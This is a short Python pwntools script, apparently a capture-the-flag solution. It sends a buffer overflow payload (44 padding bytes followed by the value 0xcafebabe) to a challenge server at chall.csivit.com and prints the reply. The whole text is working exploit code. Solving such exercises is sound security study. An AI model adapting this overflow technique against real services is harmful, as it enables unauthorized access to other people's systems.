from pwn import *
payload = 'A'*44+p32(0xcafebabe)
p = remote('chall.csivit.com', 30007)
print p.recv()
p.sendline(payload)
print p.recvall()
